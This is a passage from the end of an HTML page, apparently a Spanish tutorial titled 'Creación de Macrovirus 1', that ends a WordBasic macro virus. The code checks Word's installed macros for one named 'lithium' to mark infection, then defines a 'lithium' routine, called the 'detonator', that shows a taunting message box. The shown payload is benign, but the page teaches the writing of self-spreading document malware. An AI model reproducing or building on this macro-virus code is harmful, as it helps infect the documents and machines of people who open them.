<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Next
i</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Else</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">If
WordBasic.CountMacros(1) &gt; 0 Then</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">For
i = 1 To WordBasic.CountMacros(1)</FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>If
WordBasic.MacroName$(i, 1) = &quot;<FONT COLOR="#ff0000">lithium</FONT>&quot;
Then</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>dopado
= si</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">Next
i</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT COLOR="#008000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt">End
If</FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#0000ff"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>End
Function</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Sub
lithium() </B><SPAN STYLE="font-weight: medium"><FONT COLOR="#000000">`El
famoso detonador</FONT></SPAN></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="font-weight: medium"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><FONT COLOR="#008000">MsgBox
&quot;I killed you, I'm not gonna crack&quot; </FONT><FONT COLOR="#000000">`Que
maloso xDD</FONT></FONT></FONT></P>
<P ALIGN=LEFT><FONT COLOR="#ff0000"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>End
Sub</B></FONT></FONT></FONT></P>
<P ALIGN=LEFT STYLE="border-top: none; border-bottom: 1px solid #000000; border-left: none; border-right: none; padding-top: 0cm; padding-bottom: 0.07cm; padding-left: 0cm; padding-right: 0cm">
<BR><BR>
</P>
<P ALIGN=LEFT><BR><BR>
<P ALIGN=LEFT><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"> Para la próxima (si la hago) , algunas técnicas interesantes para terminar del todo el tema ;)
</P>
<DIV TYPE=FOOTER>
	<P ALIGN=CENTER STYLE="margin-top: 0.5cm; margin-bottom: 0cm"><FONT COLOR="#0000ff"><FONT FACE="Arial, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Creación de Macrovirus 1 - http://www.disidents.org/</B></FONT></FONT></FONT></P>
</DIV>

</BODY>
</HTML>